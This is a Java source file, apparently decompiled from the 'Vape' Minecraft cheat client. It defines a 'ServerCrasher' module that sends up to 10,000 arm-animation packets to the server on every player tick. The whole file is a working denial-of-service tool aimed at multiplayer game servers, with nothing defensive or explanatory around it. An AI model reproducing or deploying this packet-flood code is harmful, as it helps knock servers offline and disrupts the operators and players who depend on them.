package gg.vape.module.other;

import gg.vape.event.impl.EventPlayerTick;
import gg.vape.module.Category;
import gg.vape.module.Mod;
import gg.vape.value.NumberValue;
import gg.vape.wrapper.impl.*;

public class Crasher extends Mod {
   NumberValue packets = NumberValue.create(this, "packets", "#", "", 0.0, 1000.0, 10000.0);

   public Crasher() {
      super("ServerCrasher", 1, Category.Other);
      this.addValue(this.packets);
   }

   public void onTick(EventPlayerTick event) {
      Object var2;
      if (ForgeVersion.minorVersion() == 13) {
         var2 = new EntityClientPlayerMP(Minecraft.thePlayer().getObject());
      } else {
         var2 = Minecraft.thePlayer();
      }

      C0APacketAnimation var3 = C0APacketAnimation.c8590();

      for(int var4 = 0; (double)var4 < this.packets.getValue(); ++var4) {
         ((EntityPlayerSP)var2).sendQueue().addToSendQueue(var3);
      }

   }
}
